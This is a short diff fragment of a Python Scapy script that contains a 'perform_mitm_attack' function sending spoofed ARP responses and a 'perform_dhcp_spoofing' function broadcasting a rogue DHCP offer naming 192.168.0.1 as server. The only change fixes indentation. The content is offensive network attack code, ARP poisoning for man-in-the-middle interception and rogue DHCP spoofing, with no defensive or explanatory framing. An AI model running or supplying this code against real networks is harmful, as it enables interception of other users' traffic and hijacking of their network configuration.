@@ -8,7 +8,7 @@ def perform_mitm_attack(target_mac, gateway_mac, interface='eth0'):
     send(arp_response_gateway, iface=interface, count=5, verbose=0)
 
 def perform_dhcp_spoofing(interface='eth0'):
-     def send_dhcp_offer():
+    def send_dhcp_offer():
         dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=67, dport=68)/BOOTP(op=2, chaddr="00:11:22:33:44:55")/DHCP(options=[("message-type", "offer"), ("server_id", "192.168.0.1"), ("lease_time", 3600), ("end")])
         sendp(dhcp_offer, iface=interface, verbose=0)
 
